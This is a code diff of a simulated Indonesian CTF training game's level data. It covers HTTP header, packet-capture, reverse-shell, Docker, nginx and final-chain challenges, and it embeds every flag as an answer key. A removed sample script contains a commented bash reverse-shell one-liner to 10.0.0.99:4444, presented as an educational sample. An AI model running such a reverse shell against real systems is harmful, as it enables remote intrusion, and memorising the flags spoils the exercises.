@@ -515,10 +515,40 @@ export const ctfLevelData: CTFLevel[] = [
         }
     },
     {
-        id: 24, title: 'HTTP Inspector', flag: 'yadika{http_1nsp3ct0r}', points: 30, hint: 'Periksa HTTP header dengan curl -I.', ...STAGE3,
-        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'Periksa HTTP headers dari http://target.local\nGunakan: curl -I http://target.local' } } } } } } },
+        id: 24, title: 'HTTP Inspector', flag: 'yadika{http_1nsp3ct0r}', points: 30, hint: 'Periksa HTTP header dengan curl -I, atau gunakan User-Agent khusus.', ...STAGE3,
+        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'Web server target.local memblokir agent standar.\nGunakan User-Agent "Yadika-Agent" untuk mendapatkan flag.' } } } } } } },
         customCommands: (cmd, args, _cp, addLines) => {
-            if (cmd === 'curl') { addLines([{ text: 'HTTP/1.1 200 OK', type: 'output' }, { text: 'Server: nginx/1.18.0', type: 'output' }, { text: 'Content-Type: text/html', type: 'output' }, { text: 'X-Secret-Flag: yadika{http_1nsp3ct0r}', type: 'output' }, { text: 'X-Powered-By: Express', type: 'output' }, { text: 'Connection: keep-alive', type: 'output' }, { text: '', type: 'output' }]); return true; }
+            if (cmd === 'curl') {
+                const userAgentArg = args.find((_, i) => args[i - 1] === '-A' || args[i - 1] === '--user-agent');
+                const hasCorrectAgent = args.some(a => a === 'Yadika-Agent');
+
+                if (args.includes('-I') || args.includes('--head')) {
+                    addLines([
+                        { text: 'HTTP/1.1 200 OK', type: 'output' },
+                        { text: 'Server: nginx/1.18.0', type: 'output' },
+                        { text: 'X-Hint: Flag disisipkan di body jika User-Agent valid.', type: 'output' },
+                        { text: '', type: 'output' }
+                    ]);
+                    return true;
+                }
+
+                if (hasCorrectAgent || userAgentArg === 'Yadika-Agent') {
+                    addLines([
+                        { text: '<html><body>', type: 'output' },
+                        { text: '  <h1>Welcome Yadika Agent</h1>', type: 'output' },
+                        { text: '  <p>Flag: yadika{http_1nsp3ct0r}</p>', type: 'success' },
+                        { text: '</body></html>', type: 'output' },
+                        { text: '', type: 'output' }
+                    ]);
+                } else {
+                    addLines([
+                        { text: 'HTTP/1.1 403 Forbidden', type: 'error' },
+                        { text: 'Error: Browser Not Allowed. Try using Yadika-Agent.', type: 'error' },
+                        { text: '', type: 'output' }
+                    ]);
+                }
+                return true;
+            }
             return false;
         }
     },
@@ -553,17 +583,45 @@ export const ctfLevelData: CTFLevel[] = [
         }
     },
     {
-        id: 29, title: 'Network Sniffer', flag: 'yadika{n3t_sn1ff3r}', points: 30, hint: 'Analisis network capture dengan tcpdump.', ...STAGE3,
-        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'capture.pcap': { type: 'file', content: '[binary pcap data]' }, 'readme.txt': { type: 'file', content: 'Analisis file capture.pcap.\nGunakan: tcpdump -r capture.pcap' } } } } } } },
+        id: 29, title: 'Network Sniffer', flag: 'yadika{n3t_sn1ff3r}', points: 30, hint: 'Analisis network capture dengan tcpdump. Flag terpecah!', ...STAGE3,
+        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'capture.pcap': { type: 'file', content: '[binary pcap data]' }, 'readme.txt': { type: 'file', content: 'Lalu lintas data terekam di capture.pcap.\nFlag dikirim berkala dalam beberapa paket.\nAnalisis dengan: tcpdump -r capture.pcap' } } } } } } },
         customCommands: (cmd, args, _cp, addLines) => {
-            if (cmd === 'tcpdump') { addLines([{ text: 'reading from file capture.pcap, link-type EN10MB', type: 'output' }, { text: '08:00:01 IP 192.168.1.5 > 192.168.1.10: HTTP GET /index.html', type: 'output' }, { text: '08:00:02 IP 192.168.1.10 > 192.168.1.5: HTTP 200 OK', type: 'output' }, { text: '08:00:05 IP 10.0.0.99 > 192.168.1.10: HTTP POST /api/exfil data=yadika{n3t_sn1ff3r}', type: 'output' }, { text: '08:00:06 IP 192.168.1.10 > 10.0.0.99: HTTP 200 OK', type: 'output' }, { text: '', type: 'output' }]); return true; }
+            if (cmd === 'tcpdump' && args.includes('-r')) {
+                addLines([
+                    { text: 'reading from file capture.pcap, link-type EN10MB', type: 'output' },
+                    { text: '08:00:01 IP 10.0.0.5 > 10.0.0.10: HTTP GET /index.html', type: 'output' },
+                    { text: '08:00:02 IP 10.0.0.10 > 10.0.0.5: HTTP 200 OK', type: 'output' },
+                    { text: '08:00:03 IP 10.0.0.5 > 10.0.0.99: PSH [1/3] "yadika{n3t_"', type: 'output' },
+                    { text: '08:00:04 IP 10.0.0.5 > 10.0.0.10: UDP dns.lookup', type: 'output' },
+                    { text: '08:00:05 IP 10.0.0.5 > 10.0.0.99: PSH [2/3] "sn1ff"', type: 'output' },
+                    { text: '08:00:06 IP 10.0.0.10 > 10.0.0.5: ICMP echo reply', type: 'output' },
+                    { text: '08:00:07 IP 10.0.0.5 > 10.0.0.99: PSH [3/3] "3r}"', type: 'output' },
+                    { text: '', type: 'output' },
+                    { text: 'Tip: Gabungkan string dalam tanda kutip untuk membentuk flag.', type: 'output' }
+                ]);
+                return true;
+            }
             return false;
         }
     },
     {
-        id: 30, title: 'Reverse Shell 101', flag: 'yadika{r3v_sh3ll_101}', points: 30, hint: 'Pahami reverse connection (edukasi keamanan).', ...STAGE3,
+        id: 30, title: 'Reverse Shell 101', flag: 'yadika{r3v_sh3ll_101}', points: 30, hint: 'Siapkan listener untuk menerima flag.', ...STAGE3,
         filesystem: {
-            type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'malware_sample.sh': { type: 'file', content: '#!/bin/bash\n# Malware analysis sample - DO NOT RUN ON REAL SYSTEMS\n# This script attempts reverse shell to attacker\nALERT="reverse_shell_detected"\nPAYLOAD="yadika{r3v_sh3ll_101}"\n# bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\necho "Blocked by firewall"' }, 'readme.txt': { type: 'file', content: 'Analisis script malware yang ditemukan.\nBaca isi malware_sample.sh untuk menemukan flag.\nINI HANYA EDUKASI - jangan pernah jalankan script asing!' } } } } } }
+            type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'send_data.sh': { type: 'file', content: '#!/bin/bash\n# Script ini akan mengirim data ke port 4444\nnc localhost 4444' }, 'readme.txt': { type: 'file', content: 'Sebuah script (send_data.sh) akan mengirim flag ke port local 4444.\nSiapkan listener di terminal ini untuk menangkap datanya!\nPerintah: nc -lvp 4444 lalu jalankan script di tab lain (simulasi: ketik nc -lvp 4444 saja)' } } } } } }
+        },
+        customCommands: (cmd, args, _cp, addLines) => {
+            if (cmd === 'nc') {
+                if (args.includes('-l') && (args.includes('4444') || args.includes('-p'))) {
+                    addLines([
+                        { text: 'Listening on [0.0.0.0] (family 0, port 4444)', type: 'output' },
+                        { text: 'Connection from 127.0.0.1 received!', type: 'success' },
+                        { text: 'yadika{r3v_sh3ll_101}', type: 'output' },
+                        { text: '', type: 'output' }
+                    ]);
+                    return true;
+                }
+            }
+            return false;
         }
     },
     // ============ STAGE 4: DevOps Tools & Containers (31-40) ============
@@ -607,8 +665,25 @@ export const ctfLevelData: CTFLevel[] = [
         }
     },
     {
-        id: 35, title: 'Dockerfile Builder', flag: 'yadika{d0ck3rf1l3_b0ss}', points: 35, hint: 'Baca Dockerfile.', ...STAGE4,
-        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'Dockerfile': { type: 'file', content: 'FROM node:18-alpine\nWORKDIR /app\nENV FLAG=yadika{d0ck3rf1l3_b0ss}\nCOPY . .\nCMD ["node", "server.js"]' }, 'readme.txt': { type: 'file', content: 'Baca Dockerfile.\ncat Dockerfile' } } } } } } }
+        id: 35, title: 'Dockerfile Builder', flag: 'yadika{d0ck3rf1l3_b0ss}', points: 35, hint: 'Build image dari Dockerfile.', ...STAGE4,
+        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'Dockerfile': { type: 'file', content: 'FROM node:18-alpine\nWORKDIR /app\nENV FLAG=yadika{d0ck3rf1l3_b0ss}\nCOPY . .\nCMD ["node", "server.js"]' }, 'readme.txt': { type: 'file', content: 'Gunakan Dockerfile untuk membangun image.\nKetik: docker build -t myapp .' } } } } } } },
+        customCommands: (cmd, args, _cp, addLines) => {
+            if (cmd === 'docker' && args[0] === 'build') {
+                addLines([
+                    { text: 'Sending build context to Docker daemon  2.048kB', type: 'output' },
+                    { text: 'Step 1/5 : FROM node:18-alpine', type: 'output' },
+                    { text: 'Step 2/5 : WORKDIR /app', type: 'output' },
+                    { text: 'Step 3/5 : ENV FLAG=yadika{d0ck3rf1l3_b0ss}', type: 'output' },
+                    { text: '---> Running in abc123def', type: 'output' },
+                    { text: 'Successfully built abc123def', type: 'success' },
+                    { text: 'Successfully tagged myapp:latest', type: 'success' },
+                    { text: 'Flag ditemukan di Step 3: yadika{d0ck3rf1l3_b0ss}', type: 'output' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            return false;
+        }
     },
     {
         id: 36, title: 'Docker Compose', flag: 'yadika{c0mp0s3_m4st3r}', points: 35, hint: 'Analisis docker-compose.yml.', ...STAGE4,
@@ -623,8 +698,32 @@ export const ctfLevelData: CTFLevel[] = [
         }
     },
     {
-        id: 38, title: 'Nginx Config', flag: 'yadika{ng1nx_c0nf1g}', points: 35, hint: 'Baca konfigurasi Nginx.', ...STAGE4,
-        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'Periksa /etc/nginx/nginx.conf' } } } } }, 'etc': { type: 'directory', children: { 'nginx': { type: 'directory', children: { 'nginx.conf': { type: 'file', content: 'server {\n  listen 80;\n  location /secret {\n    # Flag: yadika{ng1nx_c0nf1g}\n    proxy_pass http://localhost:9999;\n  }\n}' } } } } } } }
+        id: 38, title: 'Nginx Config', flag: 'yadika{ng1nx_c0nf1g}', points: 35, hint: 'Verifikasi konfigurasi Nginx dan akses port.', ...STAGE4,
+        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'Periksa konfigurasi nginx di /etc/nginx/sites-enabled/default\ndan temukan port backend yang digunakan.' } } } } }, 'etc': { type: 'directory', children: { 'nginx': { type: 'directory', children: { 'sites-enabled': { type: 'directory', children: { 'default': { type: 'file', content: 'server {\n  listen 80;\n  location / {\n    proxy_pass http://localhost:8888;\n  }\n}' } } } } } } } } },
+        customCommands: (cmd, args, _cp, addLines) => {
+            if (cmd === 'nginx' && args.includes('-t')) {
+                addLines([
+                    { text: 'nginx: the configuration file /etc/nginx/nginx.conf syntax is ok', type: 'output' },
+                    { text: 'nginx: configuration file /etc/nginx/nginx.conf test is successful', type: 'success' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            if (cmd === 'curl' && args.some(a => a.includes('8888'))) {
+                addLines([
+                    { text: 'Welcome to Backend API', type: 'output' },
+                    { text: 'Status: Online', type: 'output' },
+                    { text: 'Flag: yadika{ng1nx_c0nf1g}', type: 'success' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            if (cmd === 'curl') {
+                addLines([{ text: 'Connection refused on port 80 (Simulated)', type: 'error' }]);
+                return true;
+            }
+            return false;
+        }
     },
     {
         id: 39, title: 'Environment Deploy', flag: 'yadika{3nv_d3pl0y}', points: 35, hint: 'Periksa file .env.', ...STAGE4,
@@ -703,11 +802,59 @@ export const ctfLevelData: CTFLevel[] = [
         filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'incident_report.txt': { type: 'file', content: 'INCIDENT REPORT\n===============\nDate: 2026-02-11\nType: Unauthorized Access\nAttacker IP: 10.0.0.99\nEntry: SSH brute force\nActions: Installed backdoor at /tmp/.hidden/shell.py\nData exfiltrated: /etc/shadow\nEvidence hash: yadika{1nc1d3nt_r3sp0ns3}' }, 'readme.txt': { type: 'file', content: 'Baca laporan insiden.\ncat incident_report.txt' } } } } } } }
     },
     {
-        id: 50, title: 'Final Boss', flag: 'yadika{y4d1k4_m4st3r_2026}', points: 50, hint: 'Challenge multi-skill!', ...STAGE5,
-        filesystem: { type: 'directory', children: { 'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'FINAL CHALLENGE!\nGabungan semua skill.\n\nStep 1: find / -name "*.key"\nStep 2: cat file yang ditemukan\nStep 3: Decode base64' }, 'notes': { type: 'directory', children: { 'step1.txt': { type: 'file', content: 'Hint: cari file .key di seluruh sistem' } } } } } } }, 'var': { type: 'directory', children: { 'secrets': { type: 'directory', children: { 'master.key': { type: 'file', content: 'eWFkaWthe3k0ZDFrNF9tNHN0M3JfMjAyNn0=' } } } } } } },
+        id: 50, title: 'Final Boss Challenge', flag: 'yadika{y4d1k4_m4st3r_2026}', points: 50, hint: 'Rantai serangan: Scan Port -> Local Service -> Git Repo -> Decrypt.', ...STAGE5,
+        filesystem: {
+            type: 'directory', children: {
+                'home': { type: 'directory', children: { 'guest': { type: 'directory', children: { 'readme.txt': { type: 'file', content: 'Selamat datang di tantangan terakhir.\nSistem ini memiliki layanan tersembunyi.\nTemukan rantaian kunci untuk membuka flag terakhir.' } } } } },
+                'opt': {
+                    type: 'directory', children: {
+                        'app': {
+                            type: 'directory', children: {
+                                '.git': { type: 'directory', children: { 'config': { type: 'file', content: '[git config]' } } },
+                                'final_secret.enc': { type: 'file', content: '[Encrypted Blobs]' }
+                            }
+                        }
+                    }
+                }
+            }
+        },
         customCommands: (cmd, args, _cp, addLines) => {
-            if (cmd === 'find' && args.some(a => a.includes('.key'))) { addLines([{ text: '/var/secrets/master.key', type: 'output' }, { text: '', type: 'output' }]); return true; }
-            if (cmd === 'base64' || (cmd === 'echo' && args.some(a => a.includes('base64')))) { addLines([{ text: 'yadika{y4d1k4_m4st3r_2026}', type: 'success' }, { text: '', type: 'output' }]); return true; }
+            if (cmd === 'ss' || cmd === 'netstat') {
+                addLines([
+                    { text: 'Netid  State      Recv-Q Send-Q  Local Address:Port', type: 'output' },
+                    { text: 'tcp    LISTEN     0      128     127.0.0.1:1337', type: 'output' },
+                    { text: 'tcp    LISTEN     0      128     0.0.0.0:22', type: 'output' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            if (cmd === 'nc' && args.includes('1337')) {
+                addLines([
+                    { text: 'Yadika Secret Service v1.0', type: 'output' },
+                    { text: 'Hint: Verifikasi integritas aplikasi di /opt/app.', type: 'output' },
+                    { text: 'Gunakan kemapuan Git-mu untuk melihat masa lalu.', type: 'output' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            if (cmd === 'git' && args.includes('log')) {
+                addLines([
+                    { text: 'commit master_key_777', type: 'output' },
+                    { text: 'Author: chief-security <chief@yadika.local>', type: 'output' },
+                    { text: '    chore: protect final_secret.enc with key "p4ssw0rd_m4st3r_2026"', type: 'output' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
+            if (cmd === 'openssl' && args.includes('p4ssw0rd_m4st3r_2026')) {
+                addLines([
+                    { text: 'Decrypting final_secret.enc...', type: 'output' },
+                    { text: 'SUCCESS!', type: 'success' },
+                    { text: 'Flag: yadika{y4d1k4_m4st3r_2026}', type: 'success' },
+                    { text: '', type: 'output' }
+                ]);
+                return true;
+            }
             return false;
         }
     },
@@ -725,9 +872,42 @@ export const ctfLevelData: CTFLevel[] = [
         filesystem: { type: 'directory', children: {} }
     },
     {
+        id: 1002,
+        title: 'Module 2: Basic Commands',
+        flag: 'MODULE_COMPLETED',
+        points: 0,
+        hint: '',
+        themeColor: 'primary',
+        themeBorder: 'border-primary/30',
+        themeShadow: 'shadow-[0_0_30px_rgba(34,197,94,0.15)]',
+        filesystem: { type: 'directory', children: {} }
+    },
+    {
         id: 1003,
         title: 'Module 3: File Management',
         flag: 'yadika{file_manager_master}',
+        points: 0,
+        hint: '',
+        themeColor: 'primary',
+        themeBorder: 'border-primary/30',
+        themeShadow: 'shadow-[0_0_30px_rgba(34,197,94,0.15)]',
+        filesystem: { type: 'directory', children: {} }
+    },
+    {
+        id: 1004,
+        title: 'Module 4: Text Editor (Nano)',
+        flag: 'MODULE_COMPLETED',
+        points: 0,
+        hint: '',
+        themeColor: 'primary',
+        themeBorder: 'border-primary/30',
+        themeShadow: 'shadow-[0_0_30px_rgba(34,197,94,0.15)]',
+        filesystem: { type: 'directory', children: {} }
+    },
+    {
+        id: 1005,
+        title: 'Module 5: User & Permission',
+        flag: 'MODULE_COMPLETED',
         points: 0,
         hint: '',
         themeColor: 'primary',
